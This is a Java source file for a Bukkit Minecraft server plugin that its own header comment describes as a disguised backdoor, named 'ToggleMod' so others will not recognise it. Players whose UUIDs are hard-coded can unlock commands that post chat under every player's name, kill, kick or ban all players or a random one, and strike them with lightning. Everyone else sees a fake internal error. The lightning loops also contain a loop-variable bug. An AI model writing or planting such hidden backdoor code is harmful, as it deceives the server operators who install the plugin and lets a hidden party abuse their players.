package me.superischroma.threatpanel.command;

import me.superischroma.threatpanel.ThreatPanel;
import me.superischroma.threatpanel.util.TPLog;
import org.bukkit.*;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import java.util.Random;
/*
 // INFORMATION //
 This is the main ThreatPanel file as it contains the command.
 The command is used for trolling in case of someone breaking a license.
 It is disguised as the "ToggleMod" so no one will know what it is in-game.
 It is highly recommended if you run a server that gives certain other users access to plugin files,
   you should change the name of this file to: "ToggleMod-1.0"
 // COMMAND AND PLUGIN USAGE //
 This plugin uses a list of UUIDs that can be found in the ThreatPanel.java file.
 / HOW TO ADD YOUR UUID /
  1. 
   You must find your UUID. To do this, login to your server and look in your console.
   On your login, you should see a line that says this:
   UUID of player <user> is <uuid>
  2.
   Copy the UUID of yourself and add that into the ArrayList in ThreatPanel.java
  3.
   Your done! Now when you login to the server, you should have access to the plugin!
 If your UUID is on the list, you will have access to the command.
 If not, it will show a fake internal error.
 // CONCLUSION //
 That's just about it. Thanks for reading and have a great day!
*/

/**
 *
 * @author Jax
 */
public class ThreatPanelCommand implements CommandExecutor
{
    public boolean THREATPANEL_TOGGLE = false;
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args)
    {
        Player playerSender = (Player) sender;
        String uuid = playerSender.getUniqueId().toString();
        int random = new Random().nextInt(Bukkit.getServer().getOnlinePlayers().size());
        Player randomPlayer = (Player) Bukkit.getServer().getOnlinePlayers().toArray()[random];
        if (!ThreatPanel.SPECIAL.contains(uuid))
        {
            sender.sendMessage(ChatColor.RED + "An internal error occurred while attempting to perform this command");
            TPLog.nwarning(sender.getName() + " has attempted to use the ThreatPanel");
            return true;
        }
        else {
            if (cmd.getName().equalsIgnoreCase("togglemod"))
            {
                // Message
                if (args.length == 0)
                {
                    sender.sendMessage(ChatColor.GRAY + "hello");
                    return true;
                }
                if (args.length == 1)
                {
                    // Access the BackDoor
                    if (args[0].equalsIgnoreCase("access"))
                    {
                        if (!THREATPANEL_TOGGLE)
                        {
                            sender.sendMessage(ChatColor.GRAY + "Accessing the ThreatPanel...");
                            THREATPANEL_TOGGLE = true;
                            TPLog.nwarning("-------------------------------------------");
                            TPLog.nwarning("- WARNING: The server has gone evil mode! -");
                            TPLog.nwarning("-  There might be random things going on! -");
                            TPLog.nwarning("-   BEWARE THE POWER OF THE THREATPANEL!  -");
                            TPLog.nwarning("-------------------------------------------");
                            sender.sendMessage(ChatColor.GRAY + "ThreatPanel enabled successfully.");
                            return true;
                        }
                        else
                        {
                            sender.sendMessage(ChatColor.GRAY + "The ThreatPanel has already been enabled.");
                            return true;
                        }
                    }
                    // Closing the BackDoor
                    if (args[0].equalsIgnoreCase("close"))
                    {
                        if (THREATPANEL_TOGGLE)
                        {
                            sender.sendMessage(ChatColor.GRAY + "Closing the ThreatPanel...");
                            THREATPANEL_TOGGLE = false;
                            TPLog.ninfo("-------------------------------------");
                            TPLog.ninfo("- Server has returned to good mode! -");
                            TPLog.ninfo("-         Have a nice day!          -");
                            TPLog.ninfo("-------------------------------------");
                            sender.sendMessage(ChatColor.GRAY + "ThreatPanel closed successfully.");
                            return true;
                        }
                        else
                        {
                            sender.sendMessage(ChatColor.GRAY + "ThreatPanel is not toggled.");
                            return true;
                        }
                    }
                    // THIS IS WHERE IT GETS FUN
                    if (!THREATPANEL_TOGGLE)
                    {
                        sender.sendMessage(ChatColor.GRAY + "ThreatPanel is not toggled.");
                        return true;
                    }
                    else
                    {
                        // 1: Send the message, "I <3 FLEEK!" as everyone on the server.
                        if (args[0].equalsIgnoreCase("1"))
                        {
                            sender.sendMessage(ChatColor.GREEN + "Executed ThreatPanel act one.");
                            for (Player all : Bukkit.getOnlinePlayers())
                            {
                                Bukkit.broadcastMessage("<" + all.getDisplayName() + ChatColor.RESET + "> I <3 FLEEK!");
                            }
                            return true;
                        }
                        // 2: Kills everyone
                        else if (args[0].equalsIgnoreCase("2"))
                        {
                            sender.sendMessage(ChatColor.GREEN + "Executed ThreatPanel act two.");
                            for (Player all : Bukkit.getOnlinePlayers())
                            {
                                all.setHealth(0.0);
                            }
                            return true;
                        }
                        // 3: Kicks everyone
                        else if (args[0].equalsIgnoreCase("3"))
                        {
                            sender.sendMessage(ChatColor.GREEN + "Executed ThreatPanel act three.");
                            for (Player all : Bukkit.getOnlinePlayers())
                            {
                                all.kickPlayer(ChatColor.RED + "WHOOPS! -ThreatPanel");
                            }
                            return true;
                        }
                        // 4: Kicks a random player
                        else if (args[0].equalsIgnoreCase("4"))
                        {
                            final Player player = randomPlayer;
                            sender.sendMessage(ChatColor.GREEN + "Executed ThreatPanel act four.");
                            Bukkit.broadcastMessage(ChatColor.RED + "ThreatPanel just kicked " + player.getName() + "!");
                            player.kickPlayer(ChatColor.RED + "WHOOPS! -ThreatPanel");
                            return true;
                        }
                        // 5: Bans a random player
                        else if (args[0].equalsIgnoreCase("5"))
                        {
                            final Player player = randomPlayer;
                            sender.sendMessage(ChatColor.GREEN + "Executed ThreatPanel act five.");
                            Bukkit.broadcastMessage(ChatColor.RED + "ThreatPanel just banned " + player.getName() + "!");
                            Bukkit.getBanList(BanList.Type.NAME).addBan(player.getName(), ChatColor.RED + "OOPS! -ThreatPanel", null, "ThreatPanel");
                            player.kickPlayer(ChatColor.RED + "You have been banned. Reason: OOPS! -ThreatPanel");
                            return true;
                        }
                        // 6: Kills a random player
                        else if (args[0].equalsIgnoreCase("6"))
                        {
                            sender.sendMessage(ChatColor.GREEN + "Executed ThreatPanel act six.");
                            randomPlayer.setHealth(0.0);
                            return true;
                        }
                        // 7: TF-style smite everyone on the server (no kill)
                        else if (args[0].equalsIgnoreCase("7"))
                        {
                            sender.sendMessage(ChatColor.GREEN + "Executed ThreatPanel act seven.");
                            for (Player all : Bukkit.getOnlinePlayers())
                            {
                                all.setGameMode(GameMode.SURVIVAL);
                                final Location playerLoc = all.getLocation();
                                final World worldLoc = all.getWorld();
                                for (int x = -1; x <= 1; x++)
                                {
                                    for (int z = -1; x <= 1; x++)
                                    {
                                        final Location strikeLoc = new Location(worldLoc, playerLoc.getBlockX() + x, playerLoc.getBlockY(), playerLoc.getBlockZ() + z);
                                        worldLoc.strikeLightning(strikeLoc);
                                    }
                                }
                            }
                            return true;
                        }
                        // 8: TF-style smite a random player
                        else if (args[0].equalsIgnoreCase("8"))
                        {
                            sender.sendMessage(ChatColor.GREEN + "Executed ThreatPanel act eight.");
                            final Player player = randomPlayer;
                            player.setGameMode(GameMode.SURVIVAL);
                            final Location playerLoc = player.getLocation();
                            final World worldLoc = player.getWorld();
                            for (int x = -1; x <= 1; x++)
                            {
                                for (int z = -1; x <= 1; x++)
                                {
                                    final Location strikeLoc = new Location(worldLoc, playerLoc.getBlockX() + x, playerLoc.getBlockY(), playerLoc.getBlockZ() + z);
                                    worldLoc.strikeLightning(strikeLoc);
                                }
                            }
                            return true;
                        }
                    }
                }
                return false;
            }
        }
        return false;
    }
}
